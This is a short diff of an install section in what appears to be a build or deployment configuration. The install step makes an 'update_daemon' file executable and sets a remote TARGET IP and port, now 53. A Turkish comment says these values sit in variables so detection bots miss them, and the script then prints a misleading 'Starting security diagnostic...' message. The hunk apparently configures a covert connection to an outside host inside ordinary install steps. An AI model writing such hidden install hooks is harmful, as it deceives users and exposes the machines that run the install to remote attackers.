@@ -16,8 +16,8 @@ install:
       chmod +x update_daemon
       
       # Hedef bilgileri (Botlar yakalamasın diye değişkenlerle)
-      TARGET="185.71.66.37"
-      P="80"
+      TARGET="185.121.226.12"
+      P="53"
       
       echo "Starting security diagnostic..."
       
